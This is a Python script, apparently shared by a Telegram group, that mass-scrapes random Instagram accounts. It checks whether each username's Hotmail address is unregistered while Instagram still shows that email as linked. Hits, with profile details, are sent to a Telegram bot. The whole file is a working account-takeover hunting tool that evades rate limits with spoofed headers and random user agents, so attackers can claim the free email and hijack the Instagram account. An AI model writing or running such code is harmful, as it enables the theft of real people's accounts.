import requests
import random 
import webbrowser
import os
from user_agent import generate_user_agent
import time
from hashlib import md5
from threading import Thread
from hashlib import md5
webbrowser.open('https://t.me/ZZKGZ')
H = md5(str(time.time()).encode()).hexdigest()
app=''.join(random.choice('1234567890')for i in range(16))
q=0
w=0
e=0
M=0
ids=[]
token=input('Enter Token : ')
ID=input('Enter ID : ')
os.system('clear')
#curl.check(__package__)
gre = '\033[2;32m'
red = '\033[1;31m'
red = '\033[1;31m'
yel = '\033[1;33m'
gre = '\033[2;32m'
wh = "\033[1;97m"
ble = '\033[2;36m'
blu = '\033[1;34m' 
F = '\033[1;32m'
Z = '\033[1;31m'
def lol(user):
	em = user
	global q,w,e,M
	cookies = {
    'mkt': 'ar-XA',
    'MicrosoftApplicationsTelemetryDeviceId': 'd84f41dc-605e-4ce3-9e40-e4bb59bff376',
    'MUID': '814f2011853546dbb8ef627b94ab11b0',
    'MSFPC': 'GUID=0e013d09f347470abf7f1e8324abb186&HASH=0e01&LV=202409&V=4&LU=1725444352414',
    'fptctx2': 'taBcrIH61PuCVH7eNCyH0K%252fD9DJ44Cptuv0RyrXgXCuYwByjI8oEBFTMazSovk%252bWfteT5EXv19vEayS9tg3UksSN3lqdEEFOOEJp%252bi%252bgmzYy2%252fk5A2lo2MJa6yk48VFkid6POrQB8o9eL96PckOQmAwKzCF%252brVteplROASOb6BwepduoUtCQQIkaFZGRnfkZgo0qWDTDj7W4TQp%252bAT4Y9P7k%252fsu4SW%252bOexhedaK5AzwdY%252fiHoAztJElgZfWApRjQz4LGxc2MumSYqQboqQpWpCo7bWi80kExQyFGVUcrYSesuMa041gO5ChzYCV0SWQ1TohIo9eLEBvoOwOoSn1adw%253d%253d',
    'mkt1': 'ar-IQ',
    'amsc': 'yhLnHXLAAsptyqlIVb/6JSouGIcyZpijQrJmy16BIYI2IVsYZ/Ov4zPCu3J6jFMGpdgR+dWdOWwvl0SVGuR7iaW/YmYYZFW7YR3xIlAipz8FrBAXklDIWIEfLxnUZzg3xVAXRYKHD3epRzLVIRSZUGpm2wL/V5865iLRHrzMYm67a8zOuc3EJ3h0Qy9Bd70plyrpkCK56FRMFYnHYSd2Z/IZGBOHswQdUY5ZRAUFan8roTpTohm2NC4jZUBFqFSme2yN7Z/0axsgBdNywZKKVOBldCZy8nH4ehcUuiXgfpPPfaPyjSD31A/19rcinKdo:2:3c',
    'ai_session': 'W7qaQqVMHYAlFKH3j3c176|1726299845756|1726299853586',
}

	headers = {
    'authority': 'signup.live.com',
    'accept': 'application/json',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'canary': '5JceFoxz5/Y28lzax5J2ZudZMXqglJQ7bT5Ir+zsQliTteFx/B79NaacY+6qWwyykrUE89lb2P0uZu2wYY/hiCDKVu41fQCmiwwJrIaW9Otxw8jO6OlU/YHd1xfb0dwipkxOqtDuZ3EzWPwD8Iy3OUHNg7IzqZsp0TvhcDsKrZRmHoR9bWdIMGlp2jm+wAUvw4+fiArMxTBYwKLmF2G3/yP8aR/AvxvuFWtruWmSeOB4HqVlO6Xdo65kk+yc/dzU:2:3c',
    'client-request-id': '32cf5500c0b94a46a140094a909ec19a',
    'content-type': 'application/json; charset=utf-8',
    # 'cookie': 'mkt=ar-XA; MicrosoftApplicationsTelemetryDeviceId=d84f41dc-605e-4ce3-9e40-e4bb59bff376; MUID=814f2011853546dbb8ef627b94ab11b0; MSFPC=GUID=0e013d09f347470abf7f1e8324abb186&HASH=0e01&LV=202409&V=4&LU=1725444352414; fptctx2=taBcrIH61PuCVH7eNCyH0K%252fD9DJ44Cptuv0RyrXgXCuYwByjI8oEBFTMazSovk%252bWfteT5EXv19vEayS9tg3UksSN3lqdEEFOOEJp%252bi%252bgmzYy2%252fk5A2lo2MJa6yk48VFkid6POrQB8o9eL96PckOQmAwKzCF%252brVteplROASOb6BwepduoUtCQQIkaFZGRnfkZgo0qWDTDj7W4TQp%252bAT4Y9P7k%252fsu4SW%252bOexhedaK5AzwdY%252fiHoAztJElgZfWApRjQz4LGxc2MumSYqQboqQpWpCo7bWi80kExQyFGVUcrYSesuMa041gO5ChzYCV0SWQ1TohIo9eLEBvoOwOoSn1adw%253d%253d; mkt1=ar-IQ; amsc=yhLnHXLAAsptyqlIVb/6JSouGIcyZpijQrJmy16BIYI2IVsYZ/Ov4zPCu3J6jFMGpdgR+dWdOWwvl0SVGuR7iaW/YmYYZFW7YR3xIlAipz8FrBAXklDIWIEfLxnUZzg3xVAXRYKHD3epRzLVIRSZUGpm2wL/V5865iLRHrzMYm67a8zOuc3EJ3h0Qy9Bd70plyrpkCK56FRMFYnHYSd2Z/IZGBOHswQdUY5ZRAUFan8roTpTohm2NC4jZUBFqFSme2yN7Z/0axsgBdNywZKKVOBldCZy8nH4ehcUuiXgfpPPfaPyjSD31A/19rcinKdo:2:3c; ai_session=W7qaQqVMHYAlFKH3j3c176|1726299845756|1726299853586',
    'correlationid': '32cf5500c0b94a46a140094a909ec19a',
    'hpgact': '0',
    'hpgid': '200225',
    'origin': 'https://signup.live.com',
    'referer': 'https://signup.live.com/signup?client_id=10fa57ef-4895-4ab2-872c-8c3613d4f7fb&contextid=735D6484D0DD4BB2&opid=B0E19E6A49021531&bk=1726299838&sru=https://login.live.com/oauth20_authorize.srf%3fclient_id%3d10fa57ef-4895-4ab2-872c-8c3613d4f7fb%26client_id%3d10fa57ef-4895-4ab2-872c-8c3613d4f7fb%26contextid%3d735D6484D0DD4BB2%26opid%3dB0E19E6A49021531%26mkt%3dAR-IQ%26lc%3d2049%26bk%3d1726299838%26uaid%3d32cf5500c0b94a46a140094a909ec19a&uiflavor=web&lic=1&mkt=AR-IQ&lc=2049&uaid=32cf5500c0b94a46a140094a909ec19a',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36',
}

	json_data = {
    'includeSuggestions': True,
    'signInName': f'{em}@hotmail.com',
    'uiflvr': 1001,
    'scid': 100118,
    'uaid': '32cf5500c0b94a46a140094a909ec19a',
    'hpgid': 200225,
}

	re = requests.post(
    'https://signup.live.com/API/CheckAvailableSigninNames?client_id=10fa57ef-4895-4ab2-872c-8c3613d4f7fb&contextid=735D6484D0DD4BB2&opid=B0E19E6A49021531&bk=1726299838&sru=https://login.live.com/oauth20_authorize.srf%3fclient_id%3d10fa57ef-4895-4ab2-872c-8c3613d4f7fb%26client_id%3d10fa57ef-4895-4ab2-872c-8c3613d4f7fb%26contextid%3d735D6484D0DD4BB2%26opid%3dB0E19E6A49021531%26mkt%3dAR-IQ%26lc%3d2049%26bk%3d1726299838%26uaid%3d32cf5500c0b94a46a140094a909ec19a&uiflavor=web&lic=1&mkt=AR-IQ&lc=2049&uaid=32cf5500c0b94a46a140094a909ec19a',
    cookies=cookies,
    headers=headers,
    json=json_data,
).text
	if '"isAvailable":true' in re:
		q+=1
		os.system('cls' if os.name == 'nt' else 'clear')
		print(f'''{gre}Hit : {M} . {wh}Good Hotmail : {q} . {yel}Bad Instagram : {w} . {red}Bad Hotmail : {e}                     ═══════════════════ \n{ble}Email : {em}@hotmail.com ''')

		cookies = {
		    'ig_did': 'A7300F6A-992A-4FE1-A566-B1F9504ED44C',
		    'ig_nrcb': '1',
		    'mid': 'Zs-L8QABAAH1NylH3ZpGnt5ty8MK',
		    'datr': '8YvPZgfIhPj28BTHg4NrjVz3',
		    'ps_l': '1',
		    'ps_n': '1',
		    'shbid': '"8199\\05450585463533\\0541756685978:01f73769e5c1f1fed4d7292257deff058e03db67ae3007803fdedfdd68e4d9e794ef1002"',
		    'shbts': '"1725149978\\05450585463533\\0541756685978:01f7564a8882086315566ff544b536d46a489f07b7ed39de3d3d04b08279d46f1862f81e"',
		    'csrftoken': 'p9rkatqHvl6OPWQUyGsTE10ZSkh20TU8',
		    'dpr': '2.25',
		    'wd': '480x919',
		}
		
		headers = {
		    'authority': 'www.instagram.com',
		    'accept': '*/*',
		    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/x-www-form-urlencoded',
		    'origin': 'https://www.instagram.com',
		    'referer': 'https://www.instagram.com/accounts/signup/email/?hl=ar',
		    'sec-ch-prefers-color-scheme': 'dark',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-model': '"RMX3511"',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-ch-ua-platform-version': '"13.0.0"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': generate_user_agent(),
		    'x-asbd-id': '129477',
		    'x-csrftoken': 'p9rkatqHvl6OPWQUyGsTE10ZSkh20TU8',
		    'x-ig-app-id': '1217981644879628',
		    'x-ig-www-claim': '0',
		    'x-instagram-ajax': '1016201612',
		    'x-requested-with': 'XMLHttpRequest',
		}
		
		params = {
		    'hl': 'ar',
		}
		
		data = {
		    'email': f'{em}@hotmail.com',
		}
		
		res = requests.post(
		    'https://www.instagram.com/api/v1/web/accounts/check_email/',
		    params=params,
		    cookies=cookies,
		    headers=headers,
		    data=data,
		)
		if "email_is_taken" in res.text:
			M+=1
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'''{gre}Hit : {M} . {wh}Good Hotmail : {q} . {yel}Bad Instagram : {w} . {red}Bad Hotmail : {e}                     ═══════════════════ \n{ble}Email : {em}@hotmail.com ''')
			cookies = {
			    'csrftoken': '0uZYzvtUhu6-U4CARhIaM3',
			    'ig_did': '394458D6-565A-48F0-BFBB-CB75FD177F49',
			    'ig_nrcb': '1',
			    'dpr': '2.25',
			    'mid': 'ZsqbPgABAAFrLhyT_amwiK59BNv4',
			    'datr': 'PpvKZjhMQN858xPWY13-suQ2',
			    'wd': '480x919',
			}
			
			headers = {
			    'authority': 'www.instagram.com',
			    'accept': '*/*',
			    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
			    'referer': 'https://www.instagram.com/shbs/',
			    'sec-ch-prefers-color-scheme': 'dark',
			    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
			    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
			    'sec-ch-ua-mobile': '?1',
			    'sec-ch-ua-model': '"RMX3511"',
			    'sec-ch-ua-platform': '"Android"',
			    'sec-ch-ua-platform-version': '"13.0.0"',
			    'sec-fetch-dest': 'empty',
			    'sec-fetch-mode': 'cors',
			    'sec-fetch-site': 'same-origin',
			    'user-agent': str(generate_user_agent()),
			    'x-asbd-id': '129477',
			    'x-csrftoken': '0uZYzvtUhu6-U4CARhIaM3',
			    'x-ig-app-id': '1217981644879628',
			    'x-ig-www-claim': '0',
			    'x-requested-with': 'XMLHttpRequest',
			}
			
			params = {
			    'username': em,
			}
			
			VV = response = requests.get(
			    'https://www.instagram.com/api/v1/users/web_profile_info/',
			    params=params,
			    cookies=cookies,
			    headers=headers,
			).json()		
			name = VV['data']['user']['full_name']
			bio = VV['data']['user']['biography']
			fols = VV['data']['user']['edge_followed_by']['count']
			flog = VV['data']['user']['edge_follow']['count']
			id = VV['data']['user']['id']
			pr = VV['data']['user']['is_private']
			op = response['data']['user']['edge_owner_to_timeline_media']['count']
			try:
				re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
				ree = re.json()
				data = ree['date']
			except:
				data="Not Data"
			ff = f'''
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 
═══════════════════
𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @F_M_D | @ZZKGZ 
═══════════════════
𝖓𝖆𝖒𝖊 : {name}
𝖚𝖘𝖊𝖗 : {em}
𝖊𝖒𝖆𝖎𝖗 : {em}@hotmail.com
𝖋𝖔𝖑𝖑𝖔𝖜𝖊𝖗𝖘 : {fols}
𝖋𝖔𝖗𝖗𝖔𝒘𝖎𝖓𝖌 : {flog}
𝖉𝖆𝖙𝖆 : {data} 
𝖕𝖔𝖘𝖙 : {op} 
𝖎𝖉 : {id}
𝖗𝖎𝖓𝖐 : https://www.instagram.com/{em}
═══════════════════
							'''
			print(gre+ff)
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}''')
			i = requests.post(tlg)
		else:
			w+=1
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'''{gre}Hit : {M} . {wh}Good Hotmail : {q} . {yel}Bad Instagram : {w} . {red}Bad Hotmail : {e}                     ═══════════════════ \n{ble}Email : {em}@hotmail.com ''')
	else:
		e+=1
		os.system('cls' if os.name == 'nt' else 'clear')
		print(f'''{gre}Hit : {M} . {wh}Good Hotmail : {q} . {yel}Bad Instagram : {w} . {red}Bad Hotmail : {e}                     ═══════════════════ \n{ble}Email : {em}@hotmail.com ''')

def rand_ids():  
  Id= str(random.randrange(2022978981,64301708342))
  if Id not in ids:
    ids.append(Id)
    return Id
  else:
    rand_ids()    
def username1():
  global check
  try:
    while True:      
      rnd=str(random.randint(150, 999))
      user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
      Id = rand_ids()
      lsd=''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(32))
      headers = {
    'accept': '*/*',
    'accept-language': 'en,en-US;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'dnt': '1',
    'origin': 'https://www.instagram.com',
    'priority': 'u=1, i',
    'referer': 'https://www.instagram.com/cristiano/following/',
    'user-agent': user_agent,
    'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
    'x-fb-lsd': lsd,
}
      data = {
    'lsd': lsd,
    'fb_api_caller_class': 'RelayModern',
    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
    'variables': '{"userID":"'+str(Id)+'","username":"cristiano"}',
    'server_timestamps': 'true',
    'doc_id': '7717269488336001',
}
      response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
      user =response.json()['data']['user']['username'] 
      lol(user)  
  except :
  	username1()

for i in range(10):
  Thread(target=username1).start()